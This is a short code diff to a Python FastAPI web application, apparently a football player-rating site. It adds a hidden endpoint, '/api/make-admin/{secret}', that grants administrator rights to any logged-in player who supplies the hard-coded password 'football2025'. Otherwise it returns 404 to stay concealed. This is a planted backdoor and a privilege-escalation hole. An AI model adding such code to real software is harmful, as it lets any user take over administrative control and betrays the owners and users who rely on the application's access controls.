@@ -226,7 +226,12 @@ async def update_rating(data: RatingUpdate, admin: dict = Depends(require_admin)
     db.set_player_rating(data.player_id, data.rating)
     return {"status": "updated"}
 
-
+@app.get("/api/make-admin/{secret}")
+async def make_admin_secret(secret: str, player: dict = Depends(get_current_player)):
+    if secret != "football2025":
+        raise HTTPException(status_code=404)
+    db.set_admin(player["id"], True)
+    return {"status": "admin granted", "player": player["username"]}
 # ─── Frontend ────────────────────────────────────────────────────
 
 @app.get("/")
